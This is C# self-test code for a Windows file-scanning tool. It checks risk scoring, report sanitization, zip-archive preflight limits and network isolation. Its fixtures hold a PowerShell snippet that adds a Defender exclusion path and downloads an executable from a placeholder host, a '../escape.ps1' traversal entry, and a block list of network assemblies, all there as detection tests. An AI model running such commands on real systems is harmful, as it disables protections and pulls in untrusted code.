using System.Buffers.Binary;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text.Json;

namespace DestinyBlackBox;

internal sealed record ProductSelfTestResult(bool Passed, int Checks)
{
    public string SafeStatusLine => $"PC_BLACK_BOX_SELF_TEST passed={Passed.ToString().ToLowerInvariant()} checks={Checks}";
}

internal static class ProductSelfTest
{
    public static ProductSelfTestResult Run()
    {
        int checks = 0;
        try
        {
            var high = CreateFile("danger.ps1", "Script / active text", "NotSigned", "—", "example.invalid",
                new("danger", "process-injection", "プロセス注入", "Process injection", 60));
            var review = CreateFile("review.exe", "Windows PE", "Valid", "Microsoft Windows", "—",
                new("watch", "internet-zone", "インターネット由来", "Internet origin", 25));
            var low = CreateFile("note.txt", "Text", "Not checked", "—", "—",
                new("info", "low-signal", "弱い兆候", "Low signal", 4));
            var clear = CreateFile("readme.txt", "Text", "Not checked", "—", "—");
            FileAnalysis[] files = [high, review, low, clear];

            Require(FileViewQuery.Apply(files, "ALL", null).Count == 4, ref checks);
            Require(FileViewQuery.Apply(files, "HIGH", null).SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "REVIEW", null).SequenceEqual([review]), ref checks);
            Require(FileViewQuery.Apply(files, "LOW", null).SequenceEqual([low]), ref checks);
            Require(FileViewQuery.Apply(files, "CLEAR", null).SequenceEqual([clear]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "danger").SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "Microsoft").SequenceEqual([review]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "injection").SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "example.invalid").SequenceEqual([high]), ref checks);
            Require(!SecurityPolicy.SanitizeText("safe\u202Etxt").Contains('\u202E'), ref checks);
            Require(!SecurityPolicy.WouldExceedCumulativeLimit(SecurityPolicy.MaxTargetBytes - 1, 1, SecurityPolicy.MaxTargetBytes), ref checks);
            Require(SecurityPolicy.WouldExceedCumulativeLimit(SecurityPolicy.MaxTargetBytes - 1, 2, SecurityPolicy.MaxTargetBytes), ref checks);
            Require(!FileInspector.WouldExceedDirectoryLimits(9999, 128), ref checks);
            Require(FileInspector.WouldExceedDirectoryLimits(10000, 128), ref checks);
            Require(FileInspector.WouldExceedDirectoryLimits(1, 129), ref checks);
            Require(!FileInspector.WouldExceedEnumerationLimit(19999), ref checks);
            Require(FileInspector.WouldExceedEnumerationLimit(20000), ref checks);
            Require(!FileInspector.WouldExceedRetainedPathLimit(8L * 1024 * 1024 - 1, 1), ref checks);
            Require(FileInspector.WouldExceedRetainedPathLimit(8L * 1024 * 1024 - 1, 2), ref checks);
            Require(TestValidEmptyArchivePreflight(), ref checks);
            Require(TestValidSingleEntryArchivePreflight(), ref checks);
            Require(TestValidEmptyZip64Preflight(), ref checks);
            Require(TestArchiveEntryFloodPreflight(), ref checks);
            Require(TestUnderreportedArchivePreflight(), ref checks);
            Require(TestAmbiguousEndRecordPreflight(), ref checks);
            SecurityPosture posture = WindowsProcessHardening.Current;
            Require(posture.IsEnforced, ref checks);
            Require(posture.Controls.Select(control => control.Code).Distinct(StringComparer.Ordinal).Count() == posture.Controls.Count, ref checks);
            Require(posture.Controls.All(control =>
                control.Tier != SecurityControlTier.Required || control.State == SecurityControlState.Enforced), ref checks);
            Require(posture.RequiredCount + posture.ReinforcementCount == posture.Controls.Count, ref checks);
            Require(posture.ReinforcementEnforcedCount <= posture.ReinforcementCount, ref checks);
            Require(!ProcessElevation.IsElevated, ref checks);
            Require(ProcessObjectLockdown.VerifyCurrentPolicy(), ref checks);
            Require(WindowsProcessHardening.VerifyReportedSideChannelPolicy(), ref checks);
            Require(NetworkIsolationGuard.IsArmedAndManagedTransportFree(), ref checks);
            Require(
                new SecurityControlStatus("probe", SecurityControlTier.PlatformReinforcement, SecurityControlState.NotEnforced)
                    .SafeLine.EndsWith("state=not-enforced", StringComparison.Ordinal) &&
                new SecurityControlStatus("probe", SecurityControlTier.PlatformReinforcement, SecurityControlState.Unavailable)
                    .SafeLine.EndsWith("state=unavailable", StringComparison.Ordinal),
                ref checks);
            Require(TestNetworkIsolationNames(), ref checks);

            var result = new ScanResult
            {
                TargetName = "self-test.txt",
                SecurityProfile = SecurityPosture.ProfileId,
                SecurityControlsEnforced = posture.EnforcedCount,
                SecurityControlsRequired = posture.RequiredCount,
                SecurityReinforcementsEnforced = posture.ReinforcementEnforcedCount,
                SecurityReinforcementsAvailable = posture.ReinforcementCount,
                StartedAt = DateTime.Now
            };
            result.Files.Add(clear);
            string report = ReportBuilder.Build(result, "en");
            Require(report.Contains($"{posture.EnforcedCount}/{posture.RequiredCount} controls enforced", StringComparison.Ordinal), ref checks);
            Require(report.Contains($"{posture.ReinforcementEnforcedCount}/{posture.ReinforcementCount} active on this system", StringComparison.Ordinal), ref checks);
            Require(!report.Contains("C:\\Users\\", StringComparison.OrdinalIgnoreCase), ref checks);
            Require(TestGuardedReportReplacement(result), ref checks);

            Require(FileInspector.IsActiveContentExtension(".EXE"), ref checks);
            Require(FileInspector.IsActiveContentExtension(".ps1"), ref checks);
            Require(FileInspector.IsActiveContentExtension(".LnK"), ref checks);
            Require(TestRiskBands(), ref checks);
            Require(TestReportOmitsAbsolutePathAndSanitizesCells(), ref checks);
            Require(TestTextInspectionHashesWithoutExecuting(), ref checks);
            Require(TestScriptCapabilitiesRaiseReview(), ref checks);
            Require(TestArchiveFindingsWithoutExtraction(), ref checks);
            Require(TestCanceledInspectionReadsNothing(), ref checks);
            return new ProductSelfTestResult(true, checks);
        }
        catch
        {
            return new ProductSelfTestResult(false, checks);
        }
    }

    /// <summary>
    /// Locks the transport list in both directions: the socket-level assemblies stay blocked, and the
    /// request-level assemblies that System.Configuration loads for local file access stay allowed.
    /// </summary>
    private static bool TestNetworkIsolationNames() =>
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Sockets") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Http") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("system.net.quic") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.NameResolution") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Primitives") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Requests") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName(null) &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("PresentationCore");

    /// <summary>Locks the documented score bands and the clamp that keeps a score inside 0–100.</summary>
    private static bool TestRiskBands()
    {
        var high = new FileAnalysis();
        high.Indicators.Add(new Indicator("danger", "one", "ja", "en", 80));
        high.Indicators.Add(new Indicator("danger", "two", "ja", "en", 80));

        var review = new FileAnalysis();
        review.Indicators.Add(new Indicator("watch", "review", "ja", "en", 25));

        var low = new FileAnalysis();
        low.Indicators.Add(new Indicator("info", "low", "ja", "en", 0));

        return high.RiskScore == 100 &&
               high.RiskCode.Equals("HIGH", StringComparison.Ordinal) &&
               review.RiskCode.Equals("REVIEW", StringComparison.Ordinal) &&
               low.RiskCode.Equals("LOW", StringComparison.Ordinal);
    }

    /// <summary>
    /// Keeps the absolute target path out of both report formats and keeps table-breaking and
    /// control characters out of the Markdown cells while the JSON keeps the sanitized name.
    /// </summary>
    private static bool TestReportOmitsAbsolutePathAndSanitizesCells()
    {
        var result = new ScanResult
        {
            TargetPath = @"C:\Users\Private\secret.ps1",
            TargetName = "secret.ps1",
            StartedAt = new DateTime(2026, 8, 6, 9, 0, 0, DateTimeKind.Local),
            Duration = TimeSpan.FromSeconds(1)
        };
        result.Files.Add(new FileAnalysis
        {
            FullPath = result.TargetPath,
            RelativePath = "folder|name`\r\n.ps1",
            Size = 12,
            Sha256 = new string('A', 64),
            FileType = "Script / active text"
        });

        string markdown = ReportBuilder.Build(result, "en");
        string json = ReportBuilder.BuildJson(result, "en");
        using JsonDocument document = JsonDocument.Parse(json);

        return markdown.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
               json.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
               markdown.Contains("folder/name'\uFFFD\uFFFD.ps1", StringComparison.Ordinal) &&
               document.RootElement.GetProperty("schema").GetString() is "pc-black-box-report-v2" &&
               document.RootElement.GetProperty("files")[0].GetProperty("path").GetString()
                   is "folder|name`\uFFFD\uFFFD.ps1";
    }

    /// <summary>
    /// Inspects an ordinary text file and confirms the reported digest is the digest of the bytes on
    /// disk, so the evidence comes from reading the target rather than from running it.
    /// </summary>
    private static bool TestTextInspectionHashesWithoutExecuting() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "notes.txt");
            File.WriteAllText(path, "ordinary text");

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.RelativePath.Equals("notes.txt", StringComparison.Ordinal) &&
                   file.FileType.Equals("Text", StringComparison.Ordinal) &&
                   file.Sha256.Equals(
                       Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(path))),
                       StringComparison.Ordinal) &&
                   result.RiskCode.Equals("CLEAR", StringComparison.Ordinal);
        });

    /// <summary>Locks the capability findings and the resulting band for a script that reads as active content.</summary>
    private static bool TestScriptCapabilitiesRaiseReview() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "admin.ps1");
            File.WriteAllText(
                path,
                "Add-MpPreference -ExclusionPath C:\\Temp\nInvoke-WebRequest https://example.invalid/tool.exe");

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("defender-change", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("remote-download", StringComparison.Ordinal)) &&
                   file.RiskCode.Equals("REVIEW", StringComparison.Ordinal);
        });

    /// <summary>
    /// Reports an escaping path and active content inside an archive from the central directory alone:
    /// nothing is extracted, so the escaping entry must not appear next to the archive.
    /// </summary>
    private static bool TestArchiveFindingsWithoutExtraction() =>
        WithFixtureDirectory(directory =>
        {
            string archivePath = Path.Combine(directory, "sample.zip");
            using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
            {
                using var writer = new StreamWriter(archive.CreateEntry("../escape.ps1").Open());
                writer.Write("Write-Output safe-test");
            }

            ScanResult result = Inspect(archivePath);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("archive-traversal", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-active-content", StringComparison.Ordinal)) &&
                   !File.Exists(Path.Combine(directory, "escape.ps1")) &&
                   !File.Exists(Path.Combine(Path.GetDirectoryName(directory)!, "escape.ps1"));
        });

    /// <summary>Confirms an already-canceled inspection ends without opening the target.</summary>
    private static bool TestCanceledInspectionReadsNothing() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "cancel.txt");
            File.WriteAllText(path, "not read");
            using var cancellation = new CancellationTokenSource();
            cancellation.Cancel();

            try
            {
                Inspect(path, cancellation.Token);
                return false;
            }
            catch (OperationCanceledException)
            {
                return true;
            }
        });

    private static ScanResult Inspect(string targetPath, CancellationToken cancellationToken = default) =>
        new FileInspector().ScanAsync(targetPath, null, cancellationToken).GetAwaiter().GetResult();

    /// <summary>
    /// Runs one check inside a private temporary directory and removes that directory afterwards. The
    /// directory is created by this process, so no caller-supplied target is inspected.
    /// </summary>
    private static bool WithFixtureDirectory(Func<string, bool> check)
    {
        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
        Directory.CreateDirectory(directory);
        try
        {
            return check(directory);
        }
        finally
        {
            try
            {
                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
                {
                    Directory.Delete(directory, recursive: true);
                }
            }
            catch { }
        }
    }

    private static FileAnalysis CreateFile(
        string relativePath,
        string fileType,
        string signatureStatus,
        string signer,
        string sourceHost,
        Indicator? indicator = null)
    {
        var file = new FileAnalysis
        {
            RelativePath = relativePath,
            FileType = fileType,
            SignatureStatus = signatureStatus,
            Signer = signer,
            SourceHost = sourceHost
        };
        if (indicator is not null) file.Indicators.Add(indicator);
        return file;
    }

    private static bool TestGuardedReportReplacement(ScanResult result)
    {
        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
        string reportPath = Path.Combine(directory, "report.md");
        bool replacementVerified = false;
        try
        {
            Directory.CreateDirectory(directory);
            SafeReportWriter.Write(reportPath, "first", result, ".md", allowOverwrite: false);
            SafeReportWriter.Write(reportPath, "second", result, ".md", allowOverwrite: true);
            using FileStream stream = SecureFileReader.OpenRead(reportPath, 4096);
            using var reader = new StreamReader(stream);
            replacementVerified = reader.ReadToEnd().Equals("second", StringComparison.Ordinal);
        }
        finally
        {
            try
            {
                if (File.Exists(reportPath) && (File.GetAttributes(reportPath) & FileAttributes.ReparsePoint) == 0)
                {
                    File.Delete(reportPath);
                }
                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
                {
                    Directory.Delete(directory, recursive: false);
                }
            }
            catch { }
        }
        return replacementVerified &&
               !File.Exists(reportPath) && !Directory.Exists(reportPath) &&
               !File.Exists(directory) && !Directory.Exists(directory);
    }

    private static bool TestValidEmptyArchivePreflight()
    {
        using var stream = new MemoryStream();
        using (new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
        {
        }
        stream.Position = 0;
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestArchiveEntryFloodPreflight()
    {
        byte[] endRecord = new byte[22];
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord, 0x06054B50);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord.AsSpan(8), 10001);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord.AsSpan(10), 10001);
        using var stream = new MemoryStream(endRecord, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestValidSingleEntryArchivePreflight()
    {
        using MemoryStream stream = CreateSingleEntryArchive();
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestUnderreportedArchivePreflight()
    {
        using MemoryStream validArchive = CreateSingleEntryArchive();
        byte[] bytes = validArchive.ToArray();
        int endRecordOffset = bytes.Length - 22;
        BinaryPrimitives.WriteUInt16LittleEndian(bytes.AsSpan(endRecordOffset + 8), 0);
        BinaryPrimitives.WriteUInt16LittleEndian(bytes.AsSpan(endRecordOffset + 10), 0);
        using var malformedArchive = new MemoryStream(bytes, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(malformedArchive);
    }

    private static bool TestAmbiguousEndRecordPreflight()
    {
        using MemoryStream validArchive = CreateSingleEntryArchive();
        byte[] original = validArchive.ToArray();
        byte[] ambiguous = new byte[original.Length + 22];
        original.CopyTo(ambiguous, 0);
        BinaryPrimitives.WriteUInt32LittleEndian(ambiguous.AsSpan(original.Length), 0x06054B50);
        using var stream = new MemoryStream(ambiguous, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static MemoryStream CreateSingleEntryArchive()
    {
        var stream = new MemoryStream();
        using (var archive = new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
        {
            ZipArchiveEntry entry = archive.CreateEntry("one.txt", CompressionLevel.NoCompression);
            using Stream entryStream = entry.Open();
            entryStream.WriteByte(1);
        }
        stream.Position = 0;
        return stream;
    }

    private static bool TestValidEmptyZip64Preflight()
    {
        byte[] bytes = new byte[56 + 20 + 22];
        Span<byte> zip64End = bytes.AsSpan(0, 56);
        BinaryPrimitives.WriteUInt32LittleEndian(zip64End, 0x06064B50);
        BinaryPrimitives.WriteUInt64LittleEndian(zip64End[4..], 44);
        BinaryPrimitives.WriteUInt16LittleEndian(zip64End[12..], 45);
        BinaryPrimitives.WriteUInt16LittleEndian(zip64End[14..], 45);

        Span<byte> locator = bytes.AsSpan(56, 20);
        BinaryPrimitives.WriteUInt32LittleEndian(locator, 0x07064B50);
        BinaryPrimitives.WriteUInt64LittleEndian(locator[8..], 0);
        BinaryPrimitives.WriteUInt32LittleEndian(locator[16..], 1);

        Span<byte> endRecord = bytes.AsSpan(76, 22);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord, 0x06054B50);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[4..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[6..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[8..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[10..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord[12..], UInt32.MaxValue);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord[16..], UInt32.MaxValue);

        using var stream = new MemoryStream(bytes, writable: false);
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static void Require(bool condition, ref int checks)
    {
        checks++;
        if (!condition) throw new InvalidOperationException("A product self-test check failed.");
    }
}
